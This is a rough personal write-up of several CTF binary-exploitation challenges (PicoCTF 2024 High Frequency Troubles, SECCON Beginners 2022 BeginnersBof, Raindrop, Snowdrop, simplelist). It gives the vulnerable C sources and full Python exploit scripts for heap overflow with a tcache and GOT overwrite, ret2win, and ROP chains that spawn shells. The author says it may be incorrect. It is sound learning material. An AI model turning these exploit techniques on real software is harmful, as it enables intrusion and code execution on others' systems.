<p>because this writeup is for my remind, it is very rough and might be incorrect especially &quot;high frequency troubles&quot;.</p>
<h1>4/27 PicoCTF 2024 High Frequency Troubles</h1>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {&quot;PKT_INFO&quot;, &quot;\x1b[1;34m&quot;},
    [PKT_MSG_DATA] = {&quot;PKT_DATA&quot;, &quot;\x1b[1;33m&quot;},
};

void putl(pkt_msg_t type, char *msg)
{
    printf(&quot;%s%s\x1b[m:[%s]\n&quot;, type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, &quot;BOOT_SQ&quot;);

    for (;;)
    {
        putl(PKT_MSG_INFO, &quot;PKT_RES&quot;);

        size_t sz = 0;
        fread(&amp;sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt-&gt;sz = sz;
        gets(&amp;pkt-&gt;data);

        switch (pkt-&gt;data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, &quot;PONG_OK&quot;);
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&amp;pkt-&gt;data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, &quot;E_INVAL&quot;);
            break;
        }
    }

    putl(PKT_MSG_INFO, &quot;BOOT_EQ&quot;);
}
</code></pre>
<p>Sending packet, it was separated to 3 parts, size, type and data.
There was a heap overflow bug in receiving data. And this program didn't have any free call.</p>
<h2>Strategy</h2>
<ul>
<li>In first, I overwrited size of topchunk to smaller value, and called malloc with a size greater than new size of topchunk to free top chunk. When I called malloc after freeing topchunk, a heap address was left in new malloced chunk so, I leaked heap address from it.</li>
<li>Next, I called malloc with the size which will cause mmap syscall. The chunk from mmap was near Thread Local Storage. So, I overwrited the address of Tcache Perthread Struct to my fake struct I sent, to manipulate tcache. By manipulating tcache I leaked glibc address, and I did GOT overwrite in libc to one_gadget by same technique of libc leak.</li>
</ul>
<pre><code class="language-python">#!/usr/bin/env python
import ptrlib as ptr


elf = ptr.ELF(&quot;./hft_patched&quot;)
libc = ptr.ELF(&quot;libc.so.6&quot;)
io = ptr.Process(elf.filepath)
# io = ptr.Socket(&quot;tethys.picoctf.net&quot;, 55233)


def send(sz, content, option=1):
    io.recvuntil(b&quot;PKT_RES&quot;)
    io.send(p32(sz))
    if len(content) != 0:
        payload = p32(0) + p64(option) + content
    else:
        payload = p32(0) + b&quot;\x01\0\0\0\0\0&quot;
    io.sendline(payload)


p64 = ptr.p64
p32 = ptr.p32
u64 = ptr.u64
info = ptr.logger.info

######################
## LEAK HEAP ADDRESS
######################

send(0x10, b&quot;&quot;)
send(0x10, b&quot;A&quot; * 8 + p64(0xD31))
send(0x1000, b&quot;B&quot; * (0x1000 - 16))
send(0x8, b&quot;&quot;)

io.recvuntil(b&quot;:[&quot;)
heap_base = u64(io.recvline().strip(b&quot;]&quot;)) - 0x2D0
info(&quot;HEAP BASE: &quot; + hex(heap_base))


######################
## LEAK LIBC ADDRESS
######################

payload = b&quot;C&quot; * (8 * 6)
payload += p64(heap_base + 0x380)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x80, payload)

payload = b&quot;D&quot; * 0x316D8 + p64(heap_base + 0x340 - 0x80)
send(0x30001, payload)

send(0x10, b&quot;&quot;)
io.recvuntil(b&quot;:[&quot;)
libc.base = u64(io.recvline().strip(b&quot;]&quot;)) - 0x21A2E0

######################
## OVERWRITE GOT IN LIBC
######################

# 全ては調べてないが、少なくとも以下の２つのGOTは書き換えるとシェルを取れる。
got_addr = libc.base + 0x219098
# got_addr = libc.base + 0x219090
info(f&quot;GOT ADDRESS BEING OVERWRITTEN: {hex(got_addr)}&quot;)

payload = b&quot;F&quot; * 0x626D8 + p64(heap_base + 0x350 - 0x80)
send(0x30001, payload, 0)

payload = b&quot;E&quot; * (8 * 6)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
if got_addr % 0x10 == 0:
    payload += p64(got_addr)
else:
    payload += p64(got_addr - 8)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x10, payload)

one_gadget = 0xEBCF5
io.send(p64(0x10))
io.send(p64(libc.base + one_gadget))

io.recvuntil(b&quot;[PKT_RES]&quot;)
io.sendline(p64(0x10))
io.sh()
</code></pre>
<h1>5/7 SECCON for Beginners 2022 BeginnersBof</h1>
<p>I got a program and its source code. <code>chall</code> and <code>src.c</code></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;err.h&gt;

#define BUFSIZE 0x10

void win() {
    char buf[0x100];
    int fd = open(&quot;flag.txt&quot;, O_RDONLY);
    if (fd == -1)
        err(1, &quot;Flag file not found...\n&quot;);
    write(1, buf, read(fd, buf, sizeof(buf)));
    close(fd);
}

int main() {
    int len = 0;
    char buf[BUFSIZE] = {0};
    puts(&quot;How long is your name?&quot;);
    scanf(&quot;%d&quot;, &amp;len);
    char c = getc(stdin);
    if (c != '\n')
        ungetc(c, stdin);
    puts(&quot;What's your name?&quot;);
    fgets(buf, len, stdin);
    printf(&quot;Hello %s&quot;, buf);
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
</code></pre>
<p><code>main</code> function has buffer overflow vulnerability obviously.
I can set length of the buffer which will save my input.
Therefore, I just overwrite a return address of the <code>main</code> to <code>win</code></p>
<pre><code class="language-python">#!/usr/bin/env python
import ptrlib as p


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = p.ELF(&quot;./chall&quot;)

offset = 40
payload = b&quot;A&quot; * offset
payload += p.p64(unwrap(elf.symbol(&quot;win&quot;)))

io = p.Process(elf.filepath)
io.sendline(str(len(payload)))
io.sendline(payload)

flag_content = io.recvregex(b&quot;flag\{(.*?)\}&quot;)[0].decode()
flag = &quot;flag{&quot; + flag_content + &quot;}&quot;
p.logger.info(f&quot;flag: {flag}&quot;)
</code></pre>
<h1>5/8 SECCON for Beginners 2022 Raindrop</h1>
<p>Source code was given.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

#define BUFF_SIZE 0x10

void help() {
    system(&quot;cat welcome.txt&quot;);
}

void show_stack(void *);
void vuln();

int main() {
    vuln();
}

void vuln() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts(&quot;You can earn points by submitting the contents of flag.txt&quot;);
    puts(&quot;Did you understand?&quot;) ;
    read(0, buf, 0x30);
    puts(&quot;bye!&quot;);
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts(&quot;stack dump...&quot;);
    printf(&quot;\n%-8s|%-20s\n&quot;, &quot;[Index]&quot;, &quot;[Value]&quot;);
    puts(&quot;========+===================&quot;);
    for (int i = 0; i &lt; 5; i++) {
        unsigned long *p = &amp;((unsigned long*)ptr)[i];
        printf(&quot; %06d | 0x%016lx &quot;, i, *p);
        if (p == ptr)
            printf(&quot; &lt;- buf&quot;);
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(&quot; &lt;- saved rbp&quot;);
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(&quot; &lt;- saved ret addr&quot;);
        puts(&quot;&quot;);
    }
    puts(&quot;finish&quot;);
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    help();
    alarm(60);
}
</code></pre>
<p>In <code>vuln</code> function, buffer overflow bug was existing in which I can overwrite 24 extra bytes.
Ths string <code>&quot;finish&quot;</code> contained <code>&quot;sh&quot;</code> and <code>system</code> was used in <code>help</code>, so I used them to create a rop chain.</p>
<pre><code class="language-python">#!/usr/bin/env python
import ptrlib as ptr


def unwrap(x):
    if x is None:
        exit(1)
    else:
        return x


elf = ptr.ELF(&quot;./chall&quot;)
io = ptr.Process(elf.filepath)

payload = b&quot;A&quot; * 24
payload += ptr.p64(next(elf.gadget(&quot;pop rdi; ret&quot;)))
payload += ptr.p64(next(elf.find(b&quot;sh\x00&quot;)))
payload += ptr.p64(0x00000000004011E5)  # help+15 ie. system()

ptr.logger.info(f&quot;payload length: {len(payload)}&quot;)
if len(payload) &gt; 48:
    ptr.logger.error(&quot;payload length is too long!&quot;)
    exit()

io.sendline(payload)
io.recvuntil(b&quot;finish&quot;)
io.recvuntil(b&quot;finish&quot;)
io.sh()
</code></pre>
<h1>5/9 SECCON for Beginners 2022 Snowdrop</h1>
<p>It was a typical ROP problem.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

#define BUFF_SIZE 0x10

void show_stack(void *);

int main() {
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts(&quot;You can earn points by submitting the contents of flag.txt&quot;);
    puts(&quot;Did you understand?&quot;) ;
    gets(buf);
    puts(&quot;bye!&quot;);
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts(&quot;stack dump...&quot;);
    printf(&quot;\n%-8s|%-20s\n&quot;, &quot;[Index]&quot;, &quot;[Value]&quot;);
    puts(&quot;========+===================&quot;);
    for (int i = 0; i &lt; 8; i++) {
        unsigned long *p = &amp;((unsigned long*)ptr)[i];
        printf(&quot; %06d | 0x%016lx &quot;, i, *p);
        if (p == ptr)
            printf(&quot; &lt;- buf&quot;);
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(&quot; &lt;- saved rbp&quot;);
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(&quot; &lt;- saved ret addr&quot;);
        puts(&quot;&quot;);
    }
    puts(&quot;finish&quot;);
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
</code></pre>
<p>In <code>main</code> function, it had a buffer overflow bug that allows an attacker to overwrite the stack without any limit.
According to the <code>checksec</code> , the program has stack canary. However, I couldn't find any stuff likes canary, so I did debug and I realized that if saved rbp was not changed, overflow was not detected. Saved rbp can be fetched from output of the program, so I inserted saved rbp in front of ROP chain.</p>
<pre><code class="language-python">#!/home/ryohz/.pyenv/shims/python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        ptr.logger.error(&quot;failed to unwrap&quot;)
        exit(1)
    else:
        return x


elf = ptr.ELF(&quot;./chall&quot;)
io = ptr.Process(elf.filepath)

io.recvuntil(b&quot;========+===================&quot;)
io.recvline()
io.recvline()
io.recvline()

rbp = int(io.recvline().split(b&quot; | &quot;)[1].strip(b&quot;  &lt;- saved rbp&quot;), 16)
ptr.logger.info(f&quot;rbp: {hex(rbp)}&quot;)

payload = b&quot;A&quot; * 16
payload += ptr.p64(rbp)
payload += ptr.p64(next(elf.gadget(&quot;pop rdx; ret;&quot;)))
payload += b&quot;/bin/sh\x00&quot;
payload += ptr.p64(next(elf.gadget(&quot;pop rax; ret;&quot;)))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget(&quot;mov [rax], rdx; pop rbx; ret;&quot;)))
payload += b&quot;AAAAAAAA&quot;
payload += ptr.p64(next(elf.gadget(&quot;pop rdi; ret;&quot;)))
payload += ptr.p64(0x4BD000)
payload += ptr.p64(next(elf.gadget(&quot;pop rsi; ret;&quot;)))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget(&quot;pop rdx; ret;&quot;)))
payload += ptr.p64(0)
payload += ptr.p64(next(elf.gadget(&quot;pop rax; ret;&quot;)))
payload += ptr.p64(0x3b)
payload += ptr.p64(next(elf.gadget(&quot;syscall; ret;&quot;)))

io.sendline(payload)
io.recvuntil(b&quot;finish&quot;)
io.recvuntil(b&quot;finish&quot;)

io.sh()
</code></pre>
<h1>5/10 SECCON for Beginners 2022 simplelist</h1>
<p>Following source code was given. According to my search, problem must has contained<code>glibc-2.33</code>in competition however, its github archive doesn't contain libc.</p>
<pre><code class="language-c">#define DEBUG 1

#include &quot;list.h&quot;

int read_int() {
  char buf[0x10];
  buf[read(0, buf, 0xf)] = 0;

  return atoi(buf);
}

void create() {
  Memo *e = malloc(sizeof(Memo));
#if DEBUG
  printf(&quot;[debug] new memo allocated at %p\n&quot;, e);
#endif
  if (e == NULL)
    err(1, &quot;%s\n&quot;, strerror(errno));

  printf(&quot;Content: &quot;);
  gets(e-&gt;content);
  e-&gt;next = NULL;
  list_add(e);
}

void edit() {
  printf(&quot;index: &quot;);
  int index = read_int();

  Memo *e = list_nth(index);

  if (e == NULL) {
    puts(&quot;Not found...&quot;);
    return;
  }

#if DEBUG
  printf(&quot;[debug] editing memo at %p\n&quot;, e);
#endif
  printf(&quot;Old content: &quot;);
  puts(e-&gt;content);
  printf(&quot;New content: &quot;);
  gets(e-&gt;content);
}

void show() {
  Memo *e = memo_list;
  if (e == NULL) {
    puts(&quot;List empty&quot;);
    return;
  }
  puts(&quot;\nList of current memos&quot;);
  puts(&quot;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-&quot;);
  for (int i = 0; e != NULL; e = e-&gt;next) {
#if DEBUG
    printf(&quot;[debug] memo_list[%d](%p)-&gt;content(%p) %s\n&quot;, i, e, e-&gt;content,
           e-&gt;content);
    printf(&quot;[debug] next(%p): %p\n&quot;, &amp;e-&gt;next, e-&gt;next);
#else
    printf(&quot;memo_list[%d] %s\n&quot;, i, e-&gt;content);
#endif
    i++;
  }
  puts(&quot;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\n&quot;);
}

void menu() {
  puts(&quot;&quot;);
  puts(&quot;1. Create new memo&quot;);
  puts(&quot;2. Edit existing memo&quot;);
  puts(&quot;3. Show memo&quot;);
  puts(&quot;4. Exit&quot;);
}

int main() {
  puts(&quot;Welcome to memo organizer&quot;);
  menu();
  printf(&quot;&gt; &quot;);
  int cmd = read_int();
  while (1) {
    switch (cmd) {
    case 1:
      create();
      break;
    case 2:
      edit();
      break;
    case 3:
      show();
      break;
    case 4:
      puts(&quot;bye!&quot;);
      exit(0);
    default:
      puts(&quot;Invalid command&quot;);
      break;
    }
    menu();
    printf(&quot;&gt; &quot;);
    cmd = read_int();
  }
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
</code></pre>
<p>And header file was given.</p>
<pre><code class="language-c">#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#define CONTENT_SIZE 0x20

typedef struct memo {
  struct memo *next;
  char content[CONTENT_SIZE];
} Memo;

Memo *memo_list = NULL;

static inline void list_add(Memo *e) {
  if (memo_list == NULL) {
    memo_list = e;
#if DEBUG
    printf(&quot;first entry created at %p\n&quot;, memo_list);
#endif
  } else {
    Memo *tail = memo_list;
    while (tail-&gt;next != NULL)
      tail = tail-&gt;next;
#if DEBUG
    printf(&quot;adding entry to %p-&gt;next\n&quot;, tail);
#endif
    tail-&gt;next = e;
  }
}

static inline Memo *list_nth(int index) {
  if (memo_list == NULL)
    return NULL;

  Memo *cur = memo_list;
  int i;
  for (i = 0; i != index &amp;&amp; cur-&gt;next != NULL; ++i, cur = cur-&gt;next)
    ;
  if (i != index)
    return NULL;
  else
    return cur;
}
</code></pre>
<p>This program is application to take notes which were consists of original linked-list structure.
<code>edit</code> function had heap overflow bug obviously.</p>
<h2>strategy</h2>
<ul>
<li>taking 2 notes.</li>
<li>editing 0 note to overwirte next address of note 1 to GOT(puts).</li>
<li>leaking libc address from contents of note 2.</li>
<li>GOT(puts) overwriting to<code>one gadget</code>by overwriting contents of note 2.</li>
</ul>
